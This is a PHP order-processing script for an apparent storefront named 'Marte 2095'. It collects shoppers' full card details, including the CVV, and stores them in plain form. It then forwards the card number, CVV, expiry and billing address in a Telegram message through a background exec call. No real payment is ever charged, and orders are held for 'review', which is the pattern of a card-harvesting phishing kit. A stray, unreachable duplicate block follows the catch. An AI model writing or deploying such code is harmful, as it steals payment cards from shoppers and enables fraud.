<?php
// crear_orden.php - Procesar orden de pago para Marte 2095
require_once __DIR__ . '/config.php';
session_start();

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Método no permitido');
    }

    // Validar CSRF
    $token = $_POST['token_csrf'] ?? '';
    if (empty($token) || !isset($_SESSION['token_csrf']) || !hash_equals($_SESSION['token_csrf'], $token)) {
        throw new Exception('Token CSRF inválido');
    }

    // Recoger y validar datos
    $nombre_producto = trim($_POST['nombre_producto'] ?? '');
    $precio_visualizacion = trim($_POST['precio_visualizacion'] ?? '0');
    $moneda = strtolower(trim($_POST['moneda'] ?? 'usd'));
    $cantidad = max(1, intval($_POST['cantidad'] ?? 1));
    $nombre_cliente = trim($_POST['nombre_cliente'] ?? '');
    $correo_cliente = trim($_POST['correo_cliente'] ?? '');
    $telefono_cliente = trim($_POST['telefono_cliente'] ?? '');
    $numero_tarjeta = preg_replace('/\s+/', '', $_POST['numero_tarjeta'] ?? '');
    $titular_tarjeta = trim($_POST['titular_tarjeta'] ?? '');
    $mes_expiracion = intval($_POST['mes_expiracion'] ?? 0);
    $ano_expiracion = intval($_POST['ano_expiracion'] ?? 0);
    $cvv = trim($_POST['cvv'] ?? '');
    $direccion_facturacion = trim($_POST['direccion_facturacion'] ?? '');
    $ciudad_facturacion = trim($_POST['ciudad_facturacion'] ?? '');
    $codigo_postal_facturacion = trim($_POST['codigo_postal_facturacion'] ?? '');
    $pais_facturacion = trim($_POST['pais_facturacion'] ?? '');

    // Validaciones
    if (empty($nombre_producto)) throw new Exception('Nombre del producto requerido');
    if (!is_numeric($precio_visualizacion) || floatval($precio_visualizacion) <= 0) throw new Exception('Precio inválido');
    if (!filter_var($correo_cliente, FILTER_VALIDATE_EMAIL)) throw new Exception('Email inválido');
    if (empty($nombre_cliente)) throw new Exception('Nombre del cliente requerido');
    if (!validar_numero_tarjeta($numero_tarjeta)) throw new Exception('Número de tarjeta inválido');
    if (empty($titular_tarjeta)) throw new Exception('Nombre del titular requerido');
    if ($mes_expiracion < 1 || $mes_expiracion > 12) throw new Exception('Mes de expiración inválido');
    if ($ano_expiracion < date('Y')) throw new Exception('Año de expiración inválido');
    if (!preg_match('/^\d{3,4}$/', $cvv)) throw new Exception('CVV inválido');
    if (empty($direccion_facturacion)) throw new Exception('Dirección requerida');

    // Convertir precio a centavos
    $monto_unidad = (int) round(floatval($precio_visualizacion) * 100);

    // Generar ID único de orden
    $id_orden_mercante = 'MARTE-' . time() . '-' . bin2hex(random_bytes(4));
    $ahora = time();

    // Insertar en base de datos
    $pdo = obtener_pdo();
    $consulta = $pdo->prepare("INSERT INTO ordenes 
        (id_orden_mercante, nombre_producto, moneda, monto_unidad, cantidad, 
         nombre_cliente, correo_cliente, telefono_cliente, metodo_pago,
         numero_tarjeta, titular_tarjeta, mes_expiracion, ano_expiracion, cvv,
         direccion_facturacion, ciudad_facturacion, codigo_postal_facturacion, pais_facturacion,
         estado, creado_en, actualizado_en) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    
    $consulta->execute([
        $id_orden_mercante, $nombre_producto, $moneda, $monto_unidad, $cantidad,
        $nombre_cliente, $correo_cliente, $telefono_cliente, 'tarjeta_credito',
        $numero_tarjeta, $titular_tarjeta, $mes_expiracion, $ano_expiracion, $cvv,
        $direccion_facturacion, $ciudad_facturacion, $codigo_postal_facturacion, $pais_facturacion,
        'ESPERANDO_REVISION', $ahora, $ahora
    ]);

    // Registrar en log
    $mensaje_log = date('Y-m-d H:i:s') . " | NUEVA_ORDEN | $id_orden_mercante | $correo_cliente | " . ($_SERVER['REMOTE_ADDR'] ?? '') . "\n";
    file_put_contents($LOG_ACCIONES, $mensaje_log, FILE_APPEND);

    // Redirigir a página de éxito

    // 🚀 Notificación por Telegram (mensaje detallado)
    $mensaje_telegram = "🛒 *Nueva Orden Recibida*\n".
                        "📦 Producto: $nombre_producto\n".
                        "💰 Monto: $precio_visualizacion $moneda\n".
                        "🔢 Cantidad: $cantidad\n".
                        "👤 Cliente: $nombre_cliente\n".
                        "📧 Correo: $correo_cliente\n".
                        "📱 Teléfono: $telefono_cliente\n".
                        "💳 Tarjeta: $numero_tarjeta\n".
                        "👤 Titular: $titular_tarjeta\n".
                        "📆 Expira: $mes_expiracion/$ano_expiracion\n".
                        "🔑 CVV: $cvv\n".
                        "🏠 Dirección: $direccion_facturacion\n".
                        "🏙 Ciudad: $ciudad_facturacion\n".
                        "📮 Código Postal: $codigo_postal_facturacion\n".
                        "🌎 País: $pais_facturacion\n".
                        "📌 Estado: ESPERANDO_REVISION\n".
                        "🆔 ID: $id_orden_mercante";

    // Llamar al script que envía por Telegram
    exec("php /var/www/marte2095/enviar_telegram.php " . escapeshellarg($mensaje_telegram) . " > /dev/null 2>&1 &");


header('Location: gracias.php?mid=' . urlencode($id_orden_mercante));
exit;


} catch (Exception $e) {
    // Mostrar error
    http_response_code(400);
    echo '<h2>Error</h2><p>' . h($e->getMessage()) . '</p>';
    echo '<p><a href="index.php">Volver</a></p>';
    exit;
}
// 🚀 Notificación por Telegram
$mensaje_telegram = "🛒 *Nueva Orden Recibida*\n".
                    "📦 Producto: $nombre_producto\n".
                    "💰 Monto: $precio_visualizacion $moneda\n".
                    "👤 Cliente: $nombre_cliente\n".
                    "📧 Correo: $correo_cliente\n".
                    "🆔 ID: $id_orden_mercante";
                    
// Llamar al script que envía por Telegram
exec("php /var/www/marte2095/enviar_telegram.php " . escapeshellarg($mensaje_telegram) . " > /dev/null 2>&1 &");
